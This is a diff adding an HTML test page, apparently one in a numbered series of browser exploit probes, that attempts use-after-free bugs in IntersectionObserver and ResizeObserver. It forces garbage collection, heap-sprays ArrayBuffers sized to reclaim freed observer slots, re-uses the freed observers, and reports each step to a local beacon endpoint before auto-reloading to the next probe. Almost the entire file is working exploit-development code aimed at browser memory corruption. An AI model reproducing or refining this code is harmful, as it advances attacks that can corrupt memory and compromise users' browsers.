@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V568</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<div id="target" style="width:50px;height:50px;background:red;position:absolute;top:0;left:0"></div>
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V568-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+beacon('BOOT','V568-io-uaf');
+
+// =============================================
+// T0: Check availability
+// =============================================
+var hasIO = typeof IntersectionObserver !== 'undefined';
+var hasRO = typeof ResizeObserver !== 'undefined';
+beacon('T0','IO='+hasIO+'|RO='+hasRO);
+
+if(!hasIO){
+  beacon('FAIL','IntersectionObserver-undefined');
+  throw new Error('STOP');
+}
+
+function forceGC(){
+  for(var g=0;g<10;g++){
+    var j=[];for(var i=0;i<5000;i++)j.push({x:new Array(100)});
+    j=null;
+  }
+}
+
+function lightGC(){
+  for(var g=0;g<3;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+// =============================================
+// T1: Basic IntersectionObserver behavior
+// =============================================
+var t1Done=false;
+(function(){
+  try{
+    var el=document.getElementById('target');
+    var callCount=0;
+    var obs=new IntersectionObserver(function(entries,observer){
+      callCount++;
+      if(callCount===1){
+        beacon('T1','callback-fired|entries='+entries.length+'|isIntersecting='+entries[0].isIntersecting);
+        t1Done=true;
+      }
+    },{threshold:0});
+    obs.observe(el);
+    beacon('T1A','observing');
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: UAF attempt — disconnect + null + GC in callback
+// =============================================
+setTimeout(function(){
+  if(!t1Done){beacon('T2','skip-t1-not-done');return;}
+  try{
+    var elements=[];
+    for(var i=0;i<20;i++){
+      var d=document.createElement('div');
+      d.style.cssText='width:10px;height:10px;background:blue;position:absolute;top:'+(i*15)+'px;left:60px';
+      document.body.appendChild(d);
+      elements.push(d);
+    }
+
+    var uafCallCount=0;
+    var obs2=new IntersectionObserver(function(entries,observer){
+      uafCallCount++;
+      beacon('T2A','callback-'+uafCallCount+'|entries='+entries.length);
+
+      if(uafCallCount===1){
+        // Step 1: disconnect — clears m_observationTargets
+        observer.disconnect();
+        beacon('T2B','disconnected');
+
+        // Step 2: remove elements from DOM
+        for(var i=0;i<elements.length;i++){
+          if(elements[i].parentNode) elements[i].parentNode.removeChild(elements[i]);
+        }
+        elements=null;
+        beacon('T2C','elements-removed');
+
+        // Step 3: null out all references
+        obs2=null;
+        // observer arg is still live but that's the C++ ref
+
+        // Step 4: aggressive GC
+        forceGC();
+        beacon('T2D','gc-done');
+
+        // Step 5: spray to reclaim the freed observer slot (~200B)
+        // Try multiple size classes
+        var spray192=[];
+        var spray256=[];
+        for(var i=0;i<200;i++){
+          spray192.push(new ArrayBuffer(184));  // 192B size class
+          spray256.push(new ArrayBuffer(248));  // 256B size class
+        }
+        beacon('T2E','spray-done|192='+spray192.length+'|256='+spray256.length);
+
+        // Step 6: try to use observer after spray
+        // The 'observer' parameter is still the C++ ref — if freed, this touches freed memory
+        try{
+          observer.disconnect(); // second disconnect on potentially freed object
+          beacon('T2F','second-disconnect=OK');
+        }catch(e){
+          beacon('T2F','second-disconnect-ERR:'+e.message);
+        }
+      }
+    },{threshold:0});
+
+    for(var i=0;i<elements.length;i++) obs2.observe(elements[i]);
+    beacon('T2','observing-'+elements.length);
+  }catch(e){beacon('T2','ERR:'+e.message)}
+},500);
+
+// =============================================
+// T3: UAF attempt — re-observe during callback to queue new entries
+// =============================================
+setTimeout(function(){
+  try{
+    var el3=document.createElement('div');
+    el3.style.cssText='width:10px;height:10px;background:green;position:absolute;top:100px;left:120px';
+    document.body.appendChild(el3);
+
+    var t3Count=0;
+    var obs3=new IntersectionObserver(function(entries,observer){
+      t3Count++;
+      beacon('T3A','callback-'+t3Count+'|entries='+entries.length);
+
+      if(t3Count===1){
+        // During callback: disconnect, then re-observe NEW elements
+        observer.disconnect();
+
+        var newEls=[];
+        for(var i=0;i<10;i++){
+          var d=document.createElement('div');
+          d.style.cssText='width:10px;height:10px;background:yellow;position:absolute;top:'+(150+i*15)+'px;left:120px';
+          document.body.appendChild(d);
+          newEls.push(d);
+          observer.observe(d); // re-observe during callback!
+        }
+        beacon('T3B','re-observed-'+newEls.length);
+
+        // Now null the outer reference and GC
+        obs3=null;
+        forceGC();
+        beacon('T3C','gc-after-reobserve');
+      }
+      if(t3Count===2){
+        beacon('T3D','second-fire-OK');
+        // If we got here, the observer survived GC while re-observed
+        // Now try the real UAF: disconnect + null + GC
+        observer.disconnect();
+        obs3=null;
+        forceGC();
+        beacon('T3E','final-gc');
+
+        // Try to access observer
+        try{
+          var targets=observer.takeRecords();
+          beacon('T3F','takeRecords='+targets.length);
+        }catch(e){
+          beacon('T3F','takeRecords-ERR:'+e.message);
+        }
+      }
+    },{threshold:0});
+
+    obs3.observe(el3);
+    beacon('T3','started');
+  }catch(e){beacon('T3','ERR:'+e.message)}
+},2000);
+
+// =============================================
+// T4: ResizeObserver UAF attempt (if available)
+// =============================================
+setTimeout(function(){
+  if(!hasRO){beacon('T4','RO-unavailable');return;}
+  try{
+    var el4=document.createElement('div');
+    el4.style.cssText='width:100px;height:100px;background:purple;position:absolute;top:200px;left:0';
+    document.body.appendChild(el4);
+
+    var t4Count=0;
+    var obs4=new ResizeObserver(function(entries,observer){
+      t4Count++;
+      beacon('T4A','callback-'+t4Count+'|entries='+entries.length);
+
+      if(t4Count===1){
+        observer.disconnect();
+        el4.parentNode.removeChild(el4);
+        el4=null;
+        obs4=null;
+        forceGC();
+        beacon('T4B','gc-done');
+
+        var spray=[];
+        for(var i=0;i<200;i++) spray.push(new ArrayBuffer(184));
+        beacon('T4C','spray-done');
+
+        try{
+          observer.disconnect();
+          beacon('T4D','second-disconnect=OK');
+        }catch(e){
+          beacon('T4D','second-disconnect-ERR:'+e.message);
+        }
+      }
+    });
+
+    obs4.observe(el4);
+    // Trigger resize to fire callback
+    setTimeout(function(){
+      if(el4) el4.style.width='200px';
+    },100);
+    beacon('T4','started');
+  }catch(e){beacon('T4','ERR:'+e.message)}
+},3500);
+
+// =============================================
+// T5: FinalizationRegistry to detect observer collection
+// =============================================
+setTimeout(function(){
+  try{
+    var collected=false;
+    var fr=new FinalizationRegistry(function(tag){
+      beacon('T5-FR','collected:'+tag);
+      collected=true;
+    });
+
+    var el5=document.createElement('div');
+    el5.style.cssText='width:10px;height:10px;position:absolute;top:300px;left:0';
+    document.body.appendChild(el5);
+
+    var obs5=new IntersectionObserver(function(entries,observer){
+      beacon('T5A','callback|entries='+entries.length);
+
+      // Disconnect and drop all refs
+      observer.disconnect();
+      obs5=null;
+      el5.parentNode.removeChild(el5);
+      el5=null;
+
+      // Register the observer parameter with FinalizationRegistry
+      // (observer is still live as the callback arg)
+      fr.register(observer,'IO-observer');
+      beacon('T5B','registered-for-finalization');
+
+      // Now drop the last ref (observer goes out of scope when callback returns)
+      // Force GC to trigger collection
+      setTimeout(function(){
+        forceGC();
+        beacon('T5C','gc-forced|collected='+collected);
+        setTimeout(function(){
+          forceGC();
+          beacon('T5D','gc2|collected='+collected);
+        },500);
+      },100);
+    },{threshold:0});
+
+    obs5.observe(el5);
+    fr.register(obs5,'IO-obs5-ref');
+    beacon('T5','started');
+  }catch(e){beacon('T5','ERR:'+e.message)}
+},5000);
+
+// =============================================
+// T6: Alias health (if canvas UAF still works)
+// =============================================
+setTimeout(function(){
+  beacon('T6','all-tests-dispatched');
+
+  // Auto-reload watchdog — reload index.html after 30s to pick up next probe
+  setTimeout(function(){
+    beacon('DONE','V568-complete');
+    setTimeout(function(){ location.href='index.html?cb='+Date.now(); },3000);
+  },25000);
+},8000);
+</script>
+</body></html>
